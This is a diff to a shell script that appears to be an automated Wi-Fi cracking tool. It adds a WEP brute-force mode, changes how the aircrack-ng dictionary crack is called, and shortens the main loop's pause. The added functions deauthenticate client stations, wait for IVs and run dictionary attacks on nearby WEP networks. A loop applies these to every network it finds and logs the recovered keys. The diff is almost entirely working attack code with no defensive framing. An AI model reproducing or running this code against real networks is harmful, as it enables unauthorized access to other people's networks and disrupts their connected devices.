@@ -549,6 +549,28 @@ h_open_try_all_networks() {
 # handle WEP networks
 #
 
+h_wep_wait_for_iv() {
+	local iv
+	local iv_min
+	local time
+	local time_start
+	local time_elapsed
+
+	iv_min=$1
+	h_log "waiting for $iv_min IVs"
+	time_start=$(h_now)
+	while [ 1 ]; do
+		sleep $H_REFRESH_DELAY
+		time=$(h_now)
+		time_elapsed=$(($time - $time_start))
+		[ $time_elapsed -ge $H_INJECTION_TIME_LIMIT ] && break
+		iv=$(h_csv_get_network_iv_count $H_CUR_CSV_F $H_CUR_BSSID)
+		h_log "got $iv IVs so far"
+		[ $iv -ge $iv_min ] && return 0
+	done
+	return 1
+}
+
 h_wep_log_key() {
 	local key
 	key=$(cat $H_CUR_KEY_F)
@@ -653,6 +675,49 @@ h_wep_attack_try() {
 	return $RC
 }
 
+h_wep_bruteforce_try() {
+	local clients
+	local country
+	local dicts
+	local RC=1
+
+	clients=$(h_csv_get_network_sta $H_CUR_CSV_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
+	if [ -n "$clients" ]; then
+		for client in $clients; do
+			h_log "found a client station: $client"
+			h_auth_start h_wep_deauth -c $client
+		done
+	else
+		h_log "no client station found"
+	fi
+
+	#country=$(get_country_from_ssid $H_CUR_ESSID)
+	country="fr"	
+	if h_wep_wait_for_iv 4; then
+		h_log "BF can start \o/ :)"
+		for keysize in 64 128; do
+			dicts=${H_LIB_D}/dict/${country}-wep${keysize}-???.dict
+			for dict in $dicts; do
+				[ -f $dict ] || continue
+				h_wep_dict_crack $keysize $dict
+				if [ -f $H_CUR_KEY_F ]; then
+					h_hook_call_handlers on_wep_key_found
+					h_wep_log_key
+					RC=0
+					break
+				fi
+			done
+		done
+	fi
+	if [ $RC -gt 0 ]; then
+		h_log "BF failed"
+	fi
+
+	h_auth_stop
+
+	return $RC
+}
+
 h_wep_crack() {
 	local cmd
 	cmd="aircrack-ng -q -b $H_CUR_BSSID -l $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT"
@@ -660,15 +725,15 @@ h_wep_crack() {
 	exec $cmd
 }
 
-h_wep_dict() {
+h_wep_dict_crack() {
 	local cmd
 	local keysize
 	local dictfile
 	keysize=$1
 	dictfile=$2
-	cmd="aircrack-ng -q -b $H_CUR_BSSID -l -n $keysize -w $dictfile $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT"
+	cmd="aircrack-ng -w $dictfile -n $keysize -a 1 -l $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT"
 	h_log "running: $cmd"
-	$cmd
+	$cmd 2>&1 >/dev/null
 }
 
 h_wep_auth() {
@@ -760,13 +825,14 @@ H_WEP_ATTACKS=" \
 
 h_wep_attack() {
 	local capture_options
+	h_wep_key_found && return
+
+	h_log "trying WEP attack mode"
 
 	h_hook_call_handlers on_wep_attack_started
 	
 	h_hw_prepare
 	
-	ifconfig $H_MON_IF up
-
 	if [ $H_CAPTURE_IV_ONLY -gt 0 ]; then
 		H_CUR_CAP_FEXT="ivs"
 		capture_options="--output-format=ivs,csv"
@@ -790,6 +856,41 @@ h_wep_attack() {
 	h_hook_call_handlers on_wep_attack_ended
 }
 
+h_wep_bruteforce() {
+	local capture_options
+	h_wep_key_found && return
+
+	h_log "trying WEP bruteforce mode"
+
+	h_hook_call_handlers on_wep_bruteforce_started
+	
+	h_hw_prepare
+	
+	if [ $H_CAPTURE_IV_ONLY -gt 0 ]; then
+		H_CUR_CAP_FEXT="ivs"
+		capture_options="--output-format=ivs,csv"
+	else
+		H_CUR_CAP_FEXT="cap"
+		capture_options="--output-format=pcap,csv"
+	fi
+	h_capture_start h_capture --write $H_CUR_BASE_FNAME --bssid $H_CUR_BSSID --channel $H_CUR_CHANNEL $capture_options
+
+	sleep $H_MONITOR_TIME_LIMIT
+
+	H_CUR_CSV_F=$(h_get_last_file $H_CUR_BASE_FNAME-??.csv)
+	H_CUR_KEY_F="$H_CUR_BASE_FNAME.key"
+	
+	h_wep_bruteforce_try
+
+	h_capture_stop
+
+	h_hook_call_handlers on_wep_bruteforce_ended
+}
+
+h_wep_key_found() {
+	grep -q "^$H_CUR_BSSID," $H_WEP_F 2>/dev/null
+}
+
 h_wep_try_one_network() {
 	local N
 
@@ -800,13 +901,14 @@ h_wep_try_one_network() {
 	H_CUR_RATE=$(h_kis_get_network_max_rate $H_ALLKIS_F $N)
 	H_CUR_BASE_FNAME=$(h_get_sane_fname $H_CUR_BSSID)
 
-	if grep -q "^$H_CUR_BSSID," $H_WEP_F; then
+	if h_wep_key_found; then
 		h_log "skipping known WEP network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
 		return 0
 	fi
 
 	h_log "trying WEP network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
 
+	[ "$H_OP_MODE_wep_bruteforce" = "1" ] && h_wep_bruteforce
 	[ "$H_OP_MODE_wep_attack" = "1" ] && h_wep_attack
 }
 
@@ -823,6 +925,6 @@ while [ 1 ]; do
 	h_monitor_all
 	h_open_try_all_networks
 	h_wep_try_all_networks
-	sleep 60
+	sleep 1
 done
 h_cleanup
